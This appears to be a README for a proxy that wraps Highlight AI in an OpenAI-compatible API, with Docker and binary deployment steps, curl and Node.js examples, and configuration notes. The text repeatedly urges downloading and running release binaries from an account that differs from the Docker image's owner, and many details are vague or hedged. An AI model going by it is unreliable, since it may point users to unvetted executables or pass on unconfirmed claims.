# Highlight2API — OpenAI-Compatible API for Highlight AI Streams

[![Releases](https://img.shields.io/github/v/release/Kalia00739/highlight2api?label=Releases&style=for-the-badge)](https://github.com/Kalia00739/highlight2api/releases)

![AI banner](https://images.unsplash.com/photo-1555949963-aa79dcee981d?auto=format&fit=crop&w=1600&q=60)

A bridge that exposes Highlight AI as an OpenAI-compatible API. It supports stream responses, function calling, and image analysis. You can deploy with Docker or run a downloaded release binary.

Features
- Compatible with OpenAI API formats and semantics.
- Stream and non-stream responses.
- Image upload and image analysis endpoints.
- Function calling (tools) support.
- Handles authentication and token refresh between Highlight and the API.
- Built-in file cache to reduce repeated downloads.
- Multi-modal chat sessions with text and images.

Releases
- Visit the releases page to get binaries or Docker images:
  https://github.com/Kalia00739/highlight2api/releases
- Download the release file and execute the binary or install the release package you need.

Quick deploy (Docker)
```bash
docker run -d -p 8080:8080 --name highlight2api ghcr.io/jhhgiyv/highlight2api:latest
```

After deployment, open:
http://<your-server-ip>:8080/highlight_login
Follow the page prompts to obtain an API key for the service. Use that API key as the Bearer token on requests.

How it works
- Client apps call standard OpenAI-style endpoints.
- Highlight2API translates the request to Highlight AI calls.
- The service handles token lifecycle and caches files.
- Responses return in the OpenAI-compatible format.
- For streaming, the endpoint delivers SSE chunks that match OpenAI stream events.

OpenAI-compatible endpoints (examples)
- POST /v1/chat/completions — chat request
- POST /v1/completions — text completions (if supported)
- POST /v1/images — upload or analyze images
- GET /v1/models — list available models
- POST /v1/moderations — content moderation (if supported)

Authentication
- The service uses an API key per client. Provide it as:
  Authorization: Bearer <API_KEY>
- The service manages the Highlight-side tokens and refresh flows.
- You can configure session TTL and cache policy via env vars.

Environment variables (common)
- H2A_BIND_ADDR=0.0.0.0:8080
- H2A_LOG_LEVEL=info
- H2A_CACHE_DIR=/var/lib/highlight2api/cache
- H2A_HIGHLIGHT_HOST=https://highlight.example.com
- H2A_HIGHLIGHT_CLIENT_ID=xxxx
- H2A_HIGHLIGHT_CLIENT_SECRET=xxxx
- H2A_ADMIN_KEY=changeme

Deployment options
- Docker (recommended for most users).
- Linux binary from Releases. Download and run the binary on your server.
- Kubernetes: run as Deployment with a LoadBalancer service. Mount a volume for cache and set env vars.

Download and run a release (binary)
- Visit the releases page:
  https://github.com/Kalia00739/highlight2api/releases
- Download the release binary or archive for your platform.
- Make the binary executable and run it:
```bash
# example steps after downloading a Linux binary
chmod +x highlight2api-linux-amd64
./highlight2api-linux-amd64 --bind 0.0.0.0:8080
```
- If you downloaded an archive, extract it and run the contained binary or installer.

Usage examples

1) Chat completion (non-stream)
```bash
curl -s -X POST "http://<host>:8080/v1/chat/completions" \
  -H "Authorization: Bearer $H2A_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "highlight-gpt-1",
    "messages": [
      {"role": "system", "content": "You are an assistant."},
      {"role": "user", "content": "Summarize the latest meeting notes."}
    ],
    "max_tokens": 400
  }'
```

2) Chat completion (stream)
- Use SSE or a streaming client. The server yields the same stream events as OpenAI.
```bash
curl -N -X POST "http://<host>:8080/v1/chat/completions" \
  -H "Authorization: Bearer $H2A_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "highlight-gpt-1",
    "messages": [{"role":"user","content":"Write a short plan for a 30-minute workshop."}],
    "stream": true
  }'
```

3) Function calling (tool use)
```bash
curl -s -X POST "http://<host>:8080/v1/chat/completions" \
  -H "Authorization: Bearer $H2A_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "highlight-gpt-1",
    "messages": [{"role":"user","content":"Check the weather for Seattle tomorrow."}],
    "functions": [
      {
        "name": "get_weather",
        "description": "Get weather info for a location",
        "parameters": {
          "type": "object",
          "properties": {
            "location": {"type":"string"},
            "date": {"type":"string", "format":"date"}
          },
          "required": ["location"]
        }
      }
    ],
    "function_call": "auto"
  }'
```
- The server will return a function_call response when the model requests a tool. The service provides a hooks layer for your tool invocations.

4) Image upload and analysis
```bash
curl -X POST "http://<host>:8080/v1/images" \
  -H "Authorization: Bearer $H2A_API_KEY" \
  -F "image=@/path/to/photo.jpg" \
  -F "purpose=analysis"
```
- The image endpoint supports multipart uploads and returns JSON with analysis results and model output.

Headers and rate limits
- The service returns the same standard headers you expect from OpenAI-style APIs.
- Configure rate limits using reverse proxies or API gateway if you need strict quotas.

Cache and files
- The service caches downloaded model assets and image files.
- Use H2A_CACHE_DIR to set the path.
- Cache reduces repeated downloads and speeds up repeat requests.

Logging and metrics
- The server exposes a metrics endpoint for Prometheus if enabled.
- Logs use structured JSON by default. Change the level with H2A_LOG_LEVEL.

Common environment configs (examples)
- Development:
  - H2A_BIND_ADDR=127.0.0.1:8080
  - H2A_LOG_LEVEL=debug
- Production:
  - H2A_BIND_ADDR=0.0.0.0:8080
  - H2A_CACHE_DIR=/var/lib/highlight2api/cache
  - H2A_LOG_LEVEL=info
  - Use HTTPS and a reverse proxy in front of the service.

Sample integration (Node.js)
```js
const fetch = require('node-fetch');

async function chat(apiKey, host, messages) {
  const res = await fetch(`${host}/v1/chat/completions`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${apiKey}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      model: 'highlight-gpt-1',
      messages
    })
  });
  return res.json();
}
```

Security
- Protect the H2A_ADMIN_KEY. Use strong secrets.
- Run behind HTTPS in production.
- Limit inbound access to the management endpoints.

Architecture overview
- API layer: Accepts OpenAI-style requests and returns compatible responses.
- Auth bridge: Exchanges and refreshes Highlight credentials.
- Model bridge: Routes requests to Highlight AI models or local adapters.
- Cache layer: Stores files, images, and temporary data.
- Tool runner: Executes function calls or tool integrations in a secure sandbox.

Extending and tools
- Add new tool adapters by implementing the tool interface in the codebase.
- Add new model adapters by mapping OpenAI parameters to Highlight endpoints.
- Plug a custom storage backend for cache.

Troubleshooting
- If you cannot get an API key, open:
  http://<your-server-ip>:8080/highlight_login
- If streaming fails, check that your client supports SSE and that the proxy does not buffer streams.
- If images fail, check file permissions and cache directory space.
- If tokens expire, verify the Highlight client credentials in env vars.

Developer tips
- Run local tests with a mock Highlight endpoint.
- Use verbose logs for initial setup.
- Keep the cache on persistent storage for stateful deployments.

Releases and downloads
[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Kalia00739/highlight2api/releases)

- Go to the releases page and pick the binary or package for your OS.
- Download the asset and run the file as shown above.
- If a release does not match your platform, build from source or use Docker.

Contributing
- Fork the repo.
- Create a branch per feature or fix.
- Open a pull request with tests and a clear description.
- Follow the repo's code style and test conventions.

License
- Check the repository for a LICENSE file on GitHub. The project typically uses a permissive license for integrations.

Authors and links
- Maintained by the Highlight2API community and contributors.
- Visit releases for binaries, changelogs, and SHA checks:
  https://github.com/Kalia00739/highlight2api/releases

FAQ
- Which models work? The service maps available Highlight models to OpenAI model names. Query /v1/models to see supported models.
- Does it stream? Yes. Set "stream": true in chat requests.
- Can I use it for images and chat in the same session? Yes. Use messages plus image uploads to produce multi-modal dialogs.